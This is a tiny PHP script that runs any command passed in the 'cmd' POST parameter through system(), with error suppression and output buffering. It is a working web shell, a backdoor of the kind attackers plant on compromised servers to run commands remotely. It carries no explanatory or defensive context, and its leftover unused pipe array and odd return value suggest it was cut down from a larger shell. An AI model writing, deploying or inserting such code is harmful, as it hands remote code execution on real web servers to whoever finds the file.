<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	if(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
	
	return $exec;
}

Exe($_POST['cmd']);
?>